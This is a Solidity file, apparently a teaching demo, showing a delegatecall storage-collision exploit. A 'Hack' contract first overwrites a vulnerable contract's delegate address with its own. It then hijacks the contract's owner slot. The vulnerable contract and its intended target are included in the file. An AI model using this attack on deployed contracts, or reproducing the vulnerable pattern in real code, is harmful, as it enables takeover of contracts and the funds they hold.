// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Hack {
    address public otherContract;
    address public owner;

    MyContract public toHack;

    constructor(address _to) {
        toHack = MyContract(_to);
    }

    function attack() external {
        // запись в переменную MyContract.otherContract значения адреса this
        toHack.delCallGetData(uint(uint160(address(this))));
        toHack.delCallGetData(0);
    }

    // интерфейс метода соответствует методу AnotherContract.getData()
    function getData(uint timestamp) external payable {
        owner = msg.sender;
    }
}

contract MyContract {
    address public otherContract;
    address public owner;
    uint public at;
    address public sender;
    uint public amount;

    constructor(address _otherContract) {
        otherContract = _otherContract;
        owner = msg.sender;
    }

    function delCallGetData(uint timestamp) external payable {
        (bool success, ) = otherContract.delegatecall(
            abi.encodeWithSelector(AnotherContract.getData.selector, timestamp)
        );

        require(success, "failed");
    }
}

contract AnotherContract {
    uint public at;
    address public sender;
    uint public amount;

    event Received(address sender, uint value);

    function getData(uint timestamp) external payable {
        at = timestamp;
        sender = msg.sender;
        amount = msg.value;

        emit Received(msg.sender, msg.value);
    }
}